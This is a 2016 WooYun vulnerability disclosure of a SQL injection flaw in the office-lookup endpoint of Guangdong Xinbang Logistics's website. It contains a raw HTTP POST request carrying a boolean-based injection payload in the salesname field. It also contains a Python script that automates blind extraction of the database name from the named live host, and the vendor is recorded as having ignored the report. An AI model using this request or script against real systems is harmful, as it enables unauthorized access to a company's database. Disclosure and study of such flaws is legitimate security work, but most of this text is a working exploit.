wybug_title: 广东新邦物流某站存在SQL注入漏洞（附验证脚本）
wybug_corp: 广东新邦物流有限公司
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2016-01-20：	细节已通知厂商并且等待厂商处理中									2016-01-25：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  
POST /businesshall/BSoffice!findOffice.action HTTP/1.1Content-Length: 243Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://e.xbwl.cn/Cookie: SESSION_COOKIE=s1; JSESSIONID=84BCE12ED441AAE1D4DF4FFB074CC443; babyface=Yes; CNZZDATA4345578=cnzz_eid%3D1622520549-1452771336-http%253A%252F%252Fwww.acunetix-referrer.com%252F%26ntime%3D1452771336; pageReferrInSession=http%3A//www.acunetix-referrer.com/javascript%3AdomxssExecutionSink%280%2C%22%27%5C%22%3E%3Cxsstag%3E%28%29refdxss%22%29; firstEnterUrlInSession=http%3A//e.xbwl.cn/website/aboutXB/11.jsp%3FpageType%3D00%26subType%3D0%26fw%3D320; CNZZDATA1760526=cnzz_eid%3D1326162297-1452771346-http%253A%252F%252Fwww.acunetix-referrer.com%252F%26ntime%3D1452771346Host: e.xbwl.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*harea=&hcity=&hprovince=&page.page=0&page.pageCount=0&page.pageSize=0&page.state=&submit=&yywd.area=555&yywd.quyu=%e5%8d%8e%e5%8d%97&yywd.salesname=-1' OR len(db_name())=3 or 'Z'='&yywd.shengfen=1&yywd.shiqu=1
为真：

为假：

db长度为3


#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded'}payloads = list(string.ascii_lowercase)payloads += list(string.ascii_uppercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.', '-', '\\', ' ']print 'Try to retrive DB:'db = ''for i in range(1,4):    for payload in payloads:            conn = httplib.HTTPConnection('e.xbwl.cn', timeout=30)            s = "harea=&hcity=&hprovince=&page.page=0&page.pageCount=0&page.pageSize=0&page.state=&submit=&yywd.area=555&yywd.quyu=%%e5%%8d%%8e%%e5%%8d%%97&yywd.shengfen=1&yywd.shiqu=1&yywd.salesname=-1' or ascii(substring(db_name(),%s,1))=%s or 'Z'=' " % (i, ord(payload))            s=urllib.quote(s,'?,=,&,/')                        conn.request(method='POST', url='/businesshall/BSoffice!findOffice.action', body=s,                         headers = headers)            html_doc = conn.getresponse().read()            conn.close()            print '.',            #print html_doc            if  html_doc.find('57424798')>0 :  # False                db += payload                print '\n[in progress]', db                break        print '\n[Done] DB is:', db
   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-25 12:00 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
